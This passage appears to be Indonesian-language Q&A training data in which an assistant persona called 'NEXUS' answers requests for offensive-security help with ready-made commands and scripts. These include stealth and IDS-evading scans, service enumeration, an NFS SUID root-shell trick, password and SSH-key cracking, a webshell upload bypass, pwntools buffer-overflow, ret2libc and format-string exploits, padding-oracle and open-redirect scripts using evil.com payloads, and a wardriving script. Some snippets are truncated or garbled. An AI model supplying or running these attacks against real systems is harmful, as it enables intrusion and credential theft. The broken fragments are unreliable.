# massdns - ultra fast
massdns -r resolvers.txt -t A -o S -w results.txt subs.txt

# Zone transfer manual (kalau misconfigured)
dig axfr target.com @ns1.target.com
dig axfr target.com @ns2.target.com
```

Zone transfer = jackpot kalo berhasil. Dapet semua DNS records sekaligus termasuk internal. Udah jarang tapi masih ada yang misconfigured terutama old infra.
scan port semua di target tapi cepet, gimana caranya?

```bash
# RustScan - fastest, scan semua port dalam detik
rustscan -a 192.168.1.100 --ulimit 5000 -- -sV -sC
rustscan -a 192.168.1.100 -r 1-65535 --ulimit 5000 -- -A

# Masscan - juga ultra fast
masscan 192.168.1.100 -p1-65535 --rate=10000 -oX masscan.xml
# Parse hasilnya ke nmap
nmap -sV -sC -iL masscan_live.txt -oA nmap_detail

# Nmap all ports (lebih lambat tapi lebih accurate)
nmap -p- --min-rate 5000 -T4 192.168.1.100 -oA allports
# Ambil ports terbuka
ports=$(grep 'open' allports.nmap | awk -F/ '{print $1}' | tr '\n' ',')
nmap -p$ports -sV -sC 192.168.1.100 -oA services

# Workflow recommended:
# 1. masscan/rustscan cepet temuin open ports
# 2. nmap -sV -sC pada ports yang open untuk detail service
```

Gw biasa pake rustscan → nmap pipeline. 65535 ports kelar dalam 30 detik, terus nmap detail di ports yang terbuka.
nmap script buat vuln scanning, yang mana yang bagus?

```bash
# Vuln scripts built-in nmap
nmap --script vuln 192.168.1.100 -oA vuln_scan

# Script kategori spesifik
nmap --script 'vuln and not dos' 192.168.1.100  # vuln tapi skip DOS
nmap --script exploit 192.168.1.100
nmap --script safe 192.168.1.100

# Script spesifik per service
# SMB vulns
nmap --script smb-vuln* 192.168.1.100 -p139,445

# HTTP vulns
nmap --script http-shellshock,http-slowloris,http-vuln* 192.168.1.100 -p80,443

# SSL/TLS
nmap --script ssl-heartbleed,ssl-poodle,ssl-dh-params 192.168.1.100 -p443

# MS17-010 EternalBlue
nmap --script smb-vuln-ms17-010 192.168.1.100 -p445

# CVE-2019-0708 BlueKeep
nmap --script rdp-vuln-ms12-020 192.168.1.100 -p3389

# FTP vulns
nmap --script ftp-vsftpd-backdoor,ftp-anon 192.168.1.100 -p21
```

Combine dengan `-sV` buat service version detection. Script `smb-vuln-ms17-010` paling worth buat cek EternalBlue yang masih banyak ada di Windows lama.
cara scan dengan nmap yang stealth, jangan sampe ketahuan IDS

```bash
# SYN scan (half-open, lebih stealth dari connect scan)
nmap -sS 192.168.1.100 -Pn

# Stealth timing (lambat tapi gak trigger IDS)
nmap -T0 192.168.1.100 -sS -Pn  # paranoid, 5 menit per probe
nmap -T1 192.168.1.100 -sS -Pn  # sneaky, 15s delay

# Decoy scan - kamuflasi source IP
nmap -D RND:10 192.168.1.100 -sS  # 10 random decoy IPs
nmap -D 192.168.1.1,192.168.1.2,ME,192.168.1.3 target

# Fragmented packets (bypass simple packet filter)
nmap -f 192.168.1.100 -sS
nmap -f -f 192.168.1.100  # 8-byte fragments

# Random port order (bypass sequential detection)
nmap --randomize-hosts 192.168.1.0/24 -sS

# Spoof source port
nmap --source-port 53 192.168.1.100  # DNS port, sering allowed
nmap --source-port 443 192.168.1.100

# No ping (skip host discovery)
nmap -Pn -sS 192.168.1.100

# Idle zombie scan (paling stealth, pake zombie host)
nmap -sI zombie_host:port target
```

Di authorized pentest, stealth penting buat test IDS/IPS effectiveness. Kalau client minta stealth engagement, `-T1 -D RND:10 --source-port 443` combo lumayan baik.
cara scan UDP ports karena sering dilupain tapi penting

```bash
# UDP scan (butuh root/sudo)
nmap -sU 192.168.1.100

# Top UDP ports (lebih cepet)
nmap -sU --top-ports 100 192.168.1.100 -oA udp_scan

# UDP + TCP sekaligus
nmap -sU -sS -p U:53,111,137,161,500,4500 -p T:22,80,443 192.168.1.100

# Port UDP yang wajib dicek:
# 53   - DNS (zone transfer, cache poisoning)
# 67   - DHCP (spoofing)
# 69   - TFTP (often no auth!)
# 111  - RPC
# 123  - NTP (amplification attack)
# 137  - NetBIOS Name Service
# 161  - SNMP (public community string = info dump)
# 500  - ISAKMP/IKE (VPN)
# 514  - Syslog
# 623  - IPMI (BMC)
# 1194 - OpenVPN
# 1900 - SSDP (UPnP)
# 5353 - mDNS

# SNMP enum (kalau UDP 161 open)
snmpwalk -v2c -c public 192.168.1.100
nmap --script snmp-info,snmp-sysdescr 192.168.1.100 -sU -p161
```

UDP scan lambat karena UDP stateless. Rate limit ke --max-rate 1000 biar gak flood network.
cara nuclei scanning buat cari vuln known di web target?

```bash
# Basic nuclei scan
nuclei -u https://target.com -o nuclei_results.txt

# Dari list URLs
nuclei -l urls.txt -o results.txt

# Filter severity
nuclei -u https://target.com -severity critical,high -o critical_high.txt

# Template spesifik
nuclei -u https://target.com -t cves/          # CVE templates
nuclei -u https://target.com -t exposures/      # Exposed configs
nuclei -u https://target.com -t misconfigurations/  # Misconfig
nuclei -u https://target.com -t default-logins/ # Default creds
nuclei -u https://target.com -t technologies/   # Tech detect

# Update templates dulu
nuclei -update-templates

# Rate limit (jangan overload)
nuclei -u https://target.com -rate-limit 50 -timeout 5

# Dengan headers (kalau butuh auth)
nuclei -u https://target.com -H 'Authorization: Bearer TOKEN' -H 'Cookie: session=xxx'

# JSON output
nuclei -u https://target.com -json-export nuclei_report.json
```

Nuclei punya 9000+ templates. Update dulu sebelum scan (`-update-templates`). Template CVE-nya yang paling valuable — bisa langsung tau service vulnerable ke CVE apa.
cara scan dan enum SMB di Windows target

```bash
# Nmap SMB enum
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p139,445 192.168.1.100
nmap --script smb-vuln-ms17-010 -p445 192.168.1.100  # EternalBlue check
nmap --script smb2-security-mode -p445 192.168.1.100  # SMB signing

# enum4linux - comprehensive SMB enum
enum4linux -a 192.168.1.100
enum4linux -a -u 'user' -p 'pass' 192.168.1.100  # authenticated

# enum4linux-ng (modern version)
enum4linux-ng -A 192.168.1.100

# smbclient - list shares
smbclient -L //192.168.1.100 -N           # null session
smbclient -L //192.168.1.100 -U 'user%pass'  # authenticated
smbclient //192.168.1.100/SHARE -N        # connect to share

# smbmap - peta permissions
smbmap -H 192.168.1.100
smbmap -H 192.168.1.100 -u 'user' -p 'pass'
smbmap -H 192.168.1.100 -R  # recursive

# crackmapexec
crackmapexec smb 192.168.1.100 -u 'user' -p 'pass' --shares
crackmapexec smb 192.168.1.100 -u 'user' -p 'pass' --users
```

Null session check penting — kalau berhasil tanpa kredensial berarti SMB misconfigured. Share IPC$ null session = bisa enum users tanpa auth.
cara scan dan enum LDAP di domain Windows Active Directory

```bash
# Check apakah LDAP open
nmap -p389,636,3268,3269 192.168.1.100 -sV

# ldapsearch - basic anonymous bind
ldapsearch -x -H ldap://192.168.1.100 -b '' -s base '(objectClass=*)'

# Enum domain base
ldapsearch -x -H ldap://192.168.1.100 -b 'DC=domain,DC=local' '(objectClass=*)' 2>/dev/null | head -50

# Authenticated enum
ldapsearch -x -H ldap://192.168.1.100 \
  -D 'CN=user,DC=domain,DC=local' \
  -w 'password' \
  -b 'DC=domain,DC=local' \
  '(objectClass=user)' cn mail sAMAccountName

# Enum users
ldapsearch -x -H ldap://192.168.1.100 -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName

# Enum groups
ldapsearch -x -H ldap://192.168.1.100 -b 'DC=domain,DC=local' '(objectClass=group)' cn

# Find admin accounts
ldapsearch -x -H ldap://192.168.1.100 -b 'DC=domain,DC=local' '(adminCount=1)' cn

# windapsearch (lebih enak)
windapsearch -d domain.local -u user -p pass --users
windapsearch -d domain.local -u user -p pass --groups
windapsearch -d domain.local -u user -p pass --admins
```

LDAP anonymous bind yang masih enabled itu misconfiguration serius — bisa dump semua AD objects tanpa credentials.
cara scan SNMP dan extract info dari network device

```bash
# Check SNMP open
nmap -sU -p161 192.168.1.0/24 --open

# snmpwalk - dump semua MIB
snmpwalk -v2c -c public 192.168.1.100      # SNMPv2c, community 'public'
snmpwalk -v1 -c public 192.168.1.100       # SNMPv1
snmpwalk -v3 -u admin -A authPass -X privPass -l authPriv 192.168.1.100  # SNMPv3

# Extract info spesifik
snmpwalk -v2c -c public 192.168.1.100 sysDescr    # OS info
snmpwalk -v2c -c public 192.168.1.100 sysName     # Hostname
snmpwalk -v2c -c public 192.168.1.100 ifDescr     # Network interfaces
snmpwalk -v2c -c public 192.168.1.100 hrSWRunName # Running processes

# onesixtyone - brute force community string
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.100
onesixtyone -c community_strings.txt -i ips.txt

# snmp-check
snmp-check 192.168.1.100 -c public

# nmap SNMP scripts
nmap --script snmp-brute,snmp-info,snmp-sysdescr,snmp-processes -sU -p161 192.168.1.100
```

SNMP v1/v2c dengan community 'public' = info dump gratis. Sering dapet: OS version, running processes, installed software, network routes, ARP table — semua berguna buat recon lebih dalam.
cara scan web app dengan nikto

```bash
# Basic scan
nikto -h https://target.com

# Dengan output file
nikto -h https://target.com -o nikto_report.txt
nikto -h https://target.com -o nikto_report.html -Format html

# Scan dengan autentikasi
nikto -h https://target.com -id user:password

# Scan via proxy (Burp Suite)
nikto -h https://target.com -useproxy http://127.0.0.1:8080

# Scan port lain

# Tuning scan (apa yang dicari)

# 1=interesting files, 2=misconfigs, 3=info disclosure

# 8=command exec, 9=SQL injection, 0=file upload, a=auth bypass
# b=software identification, c=RCE

# Scan spesifik checks
nikto -h https://target.com -Plugins 'headers;cookies'

# Multiple hosts
nikto -h hosts.txt -o results.csv -Format csv
```

Nikto cepet buat initial web vuln scan. Sering nemuin: default files, CGI vulns, backup files (.bak, .old), debug info, server misconfigs.
cara scan wordpress dan cari plugin yang vulnerable

```bash
# WPScan basic
wpscan --url https://target.com

# Enum users, plugins, themes, timthumbs
wpscan --url https://target.com --enumerate u,ap,at,tt
# u=users, ap=all plugins, at=all themes, tt=timthumbs

# Dengan API token (buat vuln info)
wpscan --url https://target.com --api-token YOUR_TOKEN --enumerate u,ap

# Aggressive detection
wpscan --url https://target.com --detection-mode aggressive --enumerate ap

# Password attack pada users yang ketemu
wpscan --url https://target.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# Via proxy
wpscan --url https://target.com --proxy http://127.0.0.1:8080

# Stealth mode
wpscan --url https://target.com --random-user-agent --detection-mode passive

# Output JSON
wpscan --url https://target.com --format json --output wpscan.json
```

Plugin vulnerable paling sering: Elementor (<3.6.1), WooCommerce (berbagai versi), Yoast SEO, Contact Form 7. Kalau nemuin plugin outdated, cek exploit di wpscan vuln DB atau exploitdb.
cara scan joomla buat cari vuln dan versinya

```bash
# Joomscan
joomscan -u https://target.com
joomscan -u https://target.com --ec  # enum components
joomscan -u https://target.com --output report.html

# droopescan (juga support drupal, wordpress)

droopescan scan joomla -u https://target.com --number 10  # 10 threads
```

cara scan drupal buat cari vuln

```bash

droopescan scan drupal -u https://target.com
droopescan scan drupal -u https://target.com -t 32  # 32 threads

curl -s https://target.com/core/CHANGELOG.txt | head -20
```

Drupalgeddon2 masih banyak unpatched instance di luar sana. CVE-2018-7600 = unauthenticated RCE. Satu command bisa dapet shell langsung.
cara scan network buat nemuin semua host yang live dengan cepet

```bash
# Nmap ping sweep (ICMP)
nmap -sn 192.168.1.0/24 -oG ping_sweep.txt
nmap -sn 192.168.1.0/24 | grep 'Host is up'

# ARP scan (lebih reliable di local network)
arp-scan -l                          # Local network
arp-scan 192.168.1.0/24
arp-scan --interface=eth0 192.168.1.0/24

# netdiscover
netdiscover -r 192.168.1.0/24
netdiscover -i eth0 -r 192.168.1.0/24 -P  # passive mode

# Masscan ping
masscan 192.168.1.0/24 -p80,443 --rate=5000 -oX hosts.xml

# fping - bulk ping
fping -a -g 192.168.1.0/24 2>/dev/null
fping -a -f ip_list.txt

# Nmap dengan multiple discovery methods
nmap -sn -PE -PS80,443 -PA -PP 192.168.1.0/24

# Parsir live hosts dari nmap output
nmap -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}' > live_hosts.txt
```

ARP scan paling reliable buat local network karena gak bisa di-block (layer 2). ICMP ping sering di-block firewall. Kombinasi ARP + TCP SYN ping buat coverage maksimal.
cara scan service version detection yang akurat di nmap

```bash
# Version detection basic
nmap -sV 192.168.1.100 -p80,443,22,21

# Intensity level (0-9, default 7)
nmap -sV --version-intensity 9 192.168.1.100  # most aggressive
nmap -sV --version-intensity 0 192.168.1.100  # quick, less accurate

# Full version + script + OS detection
nmap -A 192.168.1.100  # = -sV -sC -O --traceroute

# OS detection
nmap -O 192.168.1.100
nmap -O --osscan-guess 192.168.1.100  # guess even if uncertain

# Banner grabbing manual
nc -v 192.168.1.100 80  # HTTP banner
nc -v 192.168.1.100 22  # SSH banner
nc -v 192.168.1.100 21  # FTP banner

# curl banner
curl -I https://192.168.1.100

# telnet (old school)
telnet 192.168.1.100 25  # SMTP

# Nmap output semua format
nmap -sV -sC 192.168.1.100 -oA scan_results
# Generates: .nmap, .xml, .gnmap
```

Version detection penting banget — tau versi spesifik = langsung bisa cari CVE. Apache 2.4.49 = CVE-2021-41773. OpenSSH 7.x = certain user enumeration vulns. Selalu jalanin `-sV`.
gimana cara vulnerability scan yang proper pake openvas atau nessus?

```bash
# OpenVAS/GVM setup (community edition)
docker run -d -p 9390:9390 -p 9392:9392 --name openvas greenbone/openvas
# Akses https://localhost:9392 (admin/admin)

# GVM CLI

gvmd --create-scanner --name='Local Scanner' --host=127.0.0.1 --port=9390

trivy fs /path/to/project
```

OpenVAS gratis dan comprehensive. Nessus Essentials limit 16 IPs tapi plugins-nya excellent. Nuclei paling flexible dan bisa di-customize.
cara scan RPC services di linux target?

```bash
# Check RPC port
nmap -sV -p111 192.168.1.100

# rpcinfo - list semua RPC services
rpcinfo -p 192.168.1.100

# Nmap RPC scripts
nmap --script rpcinfo 192.168.1.100 -p111
nmap --script nfs-ls,nfs-showmount,nfs-statfs 192.168.1.100

# NFS enum (kalau ada NFS)
showmount -e 192.168.1.100          # list exported shares
mount -t nfs 192.168.1.100:/share /mnt/nfs  # mount share

# NFS no_root_squash exploit
# Kalau no_root_squash enabled, mount NFS dan buat SUID binary:
mount -t nfs 192.168.1.100:/home /mnt/nfs
cd /mnt/nfs
cp /bin/bash .
chmod +s bash  # set SUID
# Di target: /home/bash -p  → root shell!

# rpcclient (Windows RPC)
rpcclient -U '' 192.168.1.100 -N
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> lookupnames administrator

# Impacket
impacket-rpcdump 192.168.1.100 | grep -i ncacn
```

NFS dengan no_root_squash = privilege escalation klasik yang masih sering ada. Kalau nemuin NFS share readable, mount dulu dan lihat isinya.

```bash
crackmapexec ssh 192.168.1.0/24 -u admin -p admin

# Router default creds check
# admin/admin, admin/password, admin/1234, root/root
# admin/admin123, admin/blank

# Shodan dork buat device jenis tertentu
shodan search 'product:"Cisco" port:23' --fields ip_str,port
# Coba telnet dengan default creds

# routersploit
```

cara scan dan identify semua service di semua port dengan output yang rapi?

```bash
# Full scan pipeline
TARGET=192.168.1.100

# Step 1: Fast port discovery
rustscan -a $TARGET --ulimit 5000 -b 1000 -- -Pn | grep 'open' | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//' > ports.txt
PORTS=$(cat ports.txt)

# Step 2: Detailed service scan
nmap -p$PORTS -sV -sC -O --reason $TARGET -oA full_scan

# Step 3: Parse hasil
cat full_scan.nmap

# Output rapi pake nmap-parse-output
nmap-parse-output full_scan.xml services | column -t

# Atau python parser
python3 - <<'EOF'
import xml.etree.ElementTree as ET
tree = ET.parse('full_scan.xml')
for port in tree.findall('.//port'):
    state = port.find('state').get('state')
    if state == 'open':
        portid = port.get('portid')
        proto = port.get('protocol')
        service = port.find('service')
        name = service.get('name', '?') if service is not None else '?'
        version = service.get('version', '') if service is not None else ''
        product = service.get('product', '') if service is not None else ''
        print(f"{proto}/{portid:5s}  {name:12s}  {product} {version}")
EOF
```

Pipeline ini efisien: rustscan temuin ports cepet, nmap detail di ports yang open. Output XML bisa di-parse programatik.

cara build automated scanner buat cari open redirect di ratusan URL?

```python
#!/usr/bin/env python3
"""NEXUS Open Redirect Scanner"""
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
    'https://evil.com%2F',
    '/%09/evil.com',
    '//%09/evil.com',
    'https:evil.com',
]

PARAMS = ['url', 'redirect', 'next', 'return', 'to', 'goto', 'target', 'link', 'dest', 'destination']

def test_url(base_url, param, payload):
    try:
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query)
        qs[param] = [payload]
        new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        r = requests.get(new_url, allow_redirects=False, timeout=5)
        if r.status_code in [301, 302, 303, 307, 308]:
            loc = r.headers.get('Location', '')
            if 'evil.com' in loc:
                return f'[VULN] {new_url} → {loc}'
    except: pass
    return None

def scan(urls_file):
    with open(urls_file) as f:
        urls = [l.strip() for l in f if l.strip()]
    tasks = [(u, p, pay) for u in urls for p in PARAMS for pay in PAYLOADS]
    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(test_url, *t): t for t in tasks}
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                print(result)

if __name__ == '__main__':
    scan(sys.argv[1] if len(sys.argv) > 1 else 'urls.txt')
```

Simpen jadi `open_redirect_scan.py`, run `python3 open_redirect_scan.py urls.txt`. Multi-threaded, cek banyak params sekaligus.

gimana cara nexus scan otomatis dari list IP dan generate report?

```python
#!/usr/bin/env python3
"""NEXUS — Auto Scanner & Report Generator"""
import subprocess, json, sys
from pathlib import Path
from datetime import datetime

def nmap_scan(target):
    cmd = f'nmap -sV -sC -p- --min-rate 3000 -oX /tmp/scan_{target.replace("/","_")}.xml {target}'
    subprocess.run(cmd, shell=True, capture_output=True)
    return f'/tmp/scan_{target.replace("/","_")}.xml'

def nuclei_scan(target):
    result = subprocess.run(
        f'nuclei -u http://{target} -severity high,critical -json-export /tmp/nuclei_{target.replace("/","_")}.json -silent',
        shell=True, capture_output=True, text=True
    )
    try:
        findings = [json.loads(l) for l in open(f'/tmp/nuclei_{target.replace("/","_")}.json')]
        return findings
    except: return []

def generate_report(targets_file):
    ts = datetime.now().strftime('%Y%m%d_%H%M')
    report_path = Path(f'nexus_report_{ts}.md')
    targets = Path(targets_file).read_text().splitlines()
    
    lines = [f'# NEXUS Security Report\nGenerated: {datetime.now()}\n\n']
    
    for target in targets:
        target = target.strip()
        if not target: continue
        print(f'[*] Scanning {target}...')
        lines.append(f'## Target: {target}\n')
        
        # Nuclei findings
        findings = nuclei_scan(target)
        if findings:
            lines.append('### Vulnerabilities Found:\n')
            for f in findings:
                severity = f.get('info', {}).get('severity', '?').upper()
                name = f.get('info', {}).get('name', 'Unknown')
                matched = f.get('matched-at', '')
                lines.append(f'- [{severity}] {name}: {matched}\n')
        else:
            lines.append('- No critical/high vulns found by nuclei\n')
        lines.append('\n')
    
    report_path.write_text(''.join(lines))
    print(f'[+] Report saved: {report_path}')

if __name__ == '__main__':
    generate_report(sys.argv[1] if len(sys.argv) > 1 else 'targets.txt')
```

Save jadi `nexus_scanner.py`, kasih list IP/domain di `targets.txt`, run `python3 nexus_scanner.py`. Auto-generate markdown report.

gimana cara fuzz directory di target.com yang pake WAF cloudflare?

WAF cloudflare ada, harus pake delay + random agent bro:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u https://target.com/FUZZ \
  -mc 200,301,302,403 \
  -t 10 \
  -p 0.5 \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
  -o ffuf_results.json
```

Flag penting:
- `-t 10` thread rendah biar gak ke-rate limit
- `-p 0.5` delay 0.5 detik per request
- `-mc 200,301,302,403` — 403 juga penting, bisa ada hidden dir

Share hasilnya nanti gw analisis mana yang worth di-explore.

cara bypass file upload restriction buat upload webshell

Step by step bro:

```bash
# 1. Cek extension yang diterima

  -F 'file=@test.txt' \
  -F 'file=@test.php' \

  -F 'file=@shell.php%00.jpg'
```

pake pwntools buat buffer overflow di CTF binary

```python
from pwn import *

# Setup
binary = './vuln'
elf = ELF(binary)
context.binary = elf

# Local atau remote
p = process(binary)  # local
# p = remote('challenge.ctf.com', 1337)  # remote

# Step 1 — cari offset dengan cyclic pattern
p.sendline(cyclic(200))
p.wait()
core = Coredump('./core')
offset = cyclic_find(core.eip)  # 32-bit
# offset = cyclic_find(core.rip)  # 64-bit
print(f'Offset: {offset}')

# Step 2 — buat exploit
p = process(binary)
payload = flat(
    b'A' * offset,
    p64(elf.sym['win']),  # alamat fungsi win()
)
p.sendline(payload)
p.interactive()
```

Share `checksec ./vuln` output dulu bro — gw liat security features apa yang aktif (ASLR, NX, PIE, canary) buat tentuin approach.
checksec output: NX enabled, PIE disabled, No canary, ASLR off

NX enabled = gak bisa execute shellcode langsung. PIE disabled + ASLR off = alamat static. Solusi: **ret2libc**!

```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Cari ROP gadgets
# ROPgadget --binary vuln | grep 'pop rdi'
POP_RDI = 0x401234  # ganti dengan hasil ROPgadget
RET = 0x40101a     # buat stack alignment

# Leak libc base via puts
payload = flat(
    b'A' * OFFSET,
    RET,           # stack alignment (kalau perlu)
    POP_RDI,
    elf.got['puts'],  # argument: puts@GOT
    elf.plt['puts'],  # call puts()
    elf.sym['main'],  # balik ke main
)

p.sendline(payload)
puts_leak = u64(p.recvuntil(b'\n').strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']
print(f'libc base: {hex(libc.address)}')

# Second payload — system('/bin/sh')
payload2 = flat(
    b'A' * OFFSET,
    RET,
    POP_RDI,
    next(libc.search(b'/bin/sh')),
    libc.sym['system'],
)
p.sendline(payload2)
p.interactive()
```

Ganti OFFSET dan gadget address dari ROPgadget output bro.

```bash
  --technique=T \
  --dbms=mysql \
  --time-sec=5 \
  --batch --dbs

  --technique=E \
  --dns-domain=COLLABORATE_URL \
  --batch --dbs
```

gimana cara exploit format string vulnerability di binary CTF?

```python
from pwn import *

p = process('./vuln')
# p = remote('ctf.com', 1337)

# Step 1 — confirm format string
# Input: %p %p %p %p %p %p
# Kalau output address-address = VULNERABLE

# Step 2 — cari offset (posisi input di stack)
for i in range(1, 20):
    p = process('./vuln')
    p.sendline(f'AAAA %{i}$p'.encode())
    output = p.recv()
    print(f'Position {i}: {output}')
    p.close()
    # Cari 0x41414141 di output = itu offset lu

# Step 3 — leak libc address
p = process('./vuln')
payload = f'%{OFFSET}$p'  # ganti OFFSET
p.sendline(payload.encode())
leak = int(p.recv().strip(), 16)

# Step 4 — arbitrary write via %n
# Write address ke GOT entry (misal puts@GOT → system)
fmt = fmtstr_payload(OFFSET, {elf.got['puts']: libc.sym['system']})
p.sendline(fmt)
p.interactive()
```

Format string = read/write arbitrary memory. Share binary-nya bro, gw analisis lebih dalam.

cara bypass ASLR di Linux exploitation?

```python
# Method 1 — Leak via format string / vulnerability lain
# Kalau ada info leak, hitung libc base:
# libc_base = leaked_addr - libc.sym['leaked_function']

# Method 2 — ret2plt (gak butuh leak)
# PLT statis, bisa langsung call puts@plt untuk leak GOT
from pwn import *
elf = ELF('./vuln')
p = process('./vuln')

payload = flat(b'A'*OFFSET, elf.plt['puts'], elf.sym['main'], elf.got['puts'])
p.sendline(payload)
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']

# Method 3 — brute force (32-bit only, ASLR cuma 8-bit)
for i in range(256):
    p = process('./vuln')
    payload = b'A'*OFFSET + p32(0xffffd000 + i*0x1000)  # guess
    p.sendline(payload)
    try:
        p.recv(timeout=1)
        print(f'HIT: {hex(0xffffd000 + i*0x1000)}')
        break
    except: p.close()

# Method 4 — no ASLR (disable buat local testing)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

64-bit ASLR = 28-bit entropy, gak bisa brute force. Harus ada info leak. 32-bit = 8-bit entropy, bisa brute bro.

cara extract semua hash dari file /etc/shadow yang udah didapet?

```bash
# Lihat isi shadow dulu
cat /etc/shadow

# Format: username:$type$salt$hash:...
# $1$ = MD5
# $2y$ = bcrypt
# $5$ = SHA256
# $6$ = SHA512 (paling umum Linux modern)

# Extract hashes ke file
cut -d: -f1,2 /etc/shadow | grep -v '\*\|!' > shadow_hashes.txt

# Unshadow (combine passwd + shadow)
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crack semua sekaligus
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
john unshadowed.txt --show  # lihat yang udah ke-crack

# Atau hashcat SHA512crypt (mode 1800)
hashcat -m 1800 shadow_hashes.txt rockyou.txt -O
```
SHA512crypt ($6$) butuh GPU kuat bro — di T4 sekitar 1700 H/s. Prioritasin user yang punya shell aktif dulu.

cara crack SSH private key yang terproteksi passphrase?

```bash
# Extract hash dari private key
ssh2john id_rsa > ssh_hash.txt

# Crack dengan john
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat (SSH RSA = mode 22921)
hashcat -m 22921 ssh_hash.txt /usr/share/wordlists/rockyou.txt

# Setelah dapet passphrase
ssh -i id_rsa user@192.168.1.100  # akan prompt passphrase
# Atau load ke agent
ssh-add id_rsa
ssh user@192.168.1.100

# Permissive key files kadang gak butuh passphrase
chmod 600 id_rsa
ssh -i id_rsa user@192.168.1.100
```
SSH private key di-crack = akses langsung ke server tanpa password bro.

cara optimasi hashcat supaya crack lebih cepet?

```bash
# Basic optimization flags
hashcat -m 0 hashes.txt rockyou.txt -O -w 4
# -O = optimized kernel (speed +20-30%)
# -w 4 = workload profile extreme

# Check GPU utilization
hashcat -m 0 hashes.txt rockyou.txt -O -w 4 --status

# Benchmark dulu
hashcat -b -m 0   # MD5 benchmark
hashcat -b -m 1000  # NTLM benchmark
hashcat -b -m 22000  # WPA benchmark

# Kombinasi attack (wordlist + rules = lebih powerful)
hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule -O

# Prince attack (combine words)
hashcat -m 1000 hashes.txt -a 6 rockyou.txt '?d?d?d?d' -O
# append 4 digits ke setiap word

# Mask attack (brute force pattern)
hashcat -m 1000 hashes.txt -a 3 'Company?d?d?d?d' -O
# CompanyXXXX pattern
```

cara analisis capture pcap dari wireless untuk extract informasi

```bash
# Wireshark CLI (tshark)

tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name | sort -u

# Extract files dari pcap
tshark -r capture.pcap --export-objects http,extracted_files/

# NetworkMiner (GUI)
nm capture.pcap

# Python scapy analysis
python3 -c "
from scapy.all import *
pkts = rdpcap('capture.pcap')
for p in pkts:
    if p.haslayer(HTTP):
        print(p[HTTP].load)
"
```

```bash
#!/bin/bash
# NEXUS Wardriving Script

IFACE=wlan0mon
OUT=wardriving_$(date +%Y%m%d)
mkdir -p $OUT

# Start monitor mode
sudo airmon-ng start wlan0

# Scan semua channel + GPS (kalau ada gpsd)
sudo airodump-ng $IFACE -w $OUT/capture --output-format csv,pcap &
AIRO_PID=$!

# Log GPS position
if command -v gpspipe &>/dev/null; then
  gpspipe -w -n 10 > $OUT/gps.json &
fi

echo '[*] Wardriving active... Ctrl+C to stop'
trap "kill $AIRO_PID; echo Done" INT
wait $AIRO_PID

echo '[+] Processing captures...'
python3 data/raw_datasets/tool_scripts/wireless/hcxtools/hcxpcapngtool $OUT/capture-01.pcap -o $OUT/hashes.hc22000
echo "[+] Handshakes saved: $(wc -l < $OUT/hashes.hc22000)"
echo "[+] Output: $OUT/"
```

cara exploit padding oracle attack di AES CBC?

```python
#!/usr/bin/env python3
# Padding Oracle Attack - AES CBC
import requests

URL = 'https://target.com/decrypt'

def oracle(ciphertext: bytes) -> bool:
    """Return True kalau padding valid."""
    r = requests.post(URL, data={'ct': ciphertext.hex()})
    return 'PaddingException' not in r.text and r.status_code != 500

def decrypt_block(c_prev: bytes, c_curr: bytes) -> bytes:
    plaintext = bytearray(16)
    intermediate = bytearray(16)
    for pad_byte in range(1, 17):
        for guess in range(256):
            crafted = bytearray(16)
            for k in range(pad_byte - 1):
                crafted[15 - k] = intermediate[15 - k] ^ pad_byte
            crafted[16 - pad_byte] = guess
            if oracle(bytes(crafted) + c_curr):
                intermediate[16 - pad_byte] = guess ^ pad_byte
                plaintext[16 - pad_byte] = intermediate[16 - pad_byte] ^ c_prev[16 - pad_byte]
                break
    return bytes(plaintext)

# Decrypt semua blocks
# ciphertext = IV + block1 + block2 + ...
```
Share ciphertext dan URL endpoint bro, gw sesuaikan script-nya.

```python
# XOR dengan key yang tau
def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

with open('encrypted.bin', 'rb') as f:
    ct = f.read()

# Kalau tau key

    # cek printable
    if all(32 <= c < 127 or c in [9, 10, 13] for c in pt):
```

cara solve Caesar cipher atau Vigenere di CTF?

```python
# Caesar brute force (ROT1-25)
ciphertext = 'KHOOR ZRUOG'
for shift in range(26):
    plain = ''.join(chr((ord(c) - ord('A') - shift) % 26 + ord('A'))
                    if c.isalpha() else c for c in ciphertext.upper())
    print(f'ROT{shift}: {plain}')

# Vigenere dengan known key
def vigenere_decrypt(ct, key):
    key = key.upper()
    result = []
    ki = 0
    for c in ct.upper():
        if c.isalpha():
            result.append(chr((ord(c) - ord(key[ki % len(key)])) % 26 + ord('A')))
            ki += 1
        else:
            result.append(c)
    return ''.join(result)

print(vigenere_decrypt('RIJVS', 'KEY'))

# Online tools:
# dcode.fr/vigenere-cipher - frequency analysis
# quipqiup.com - substitution cipher
# CyberChef punya semua cipher
```

```python
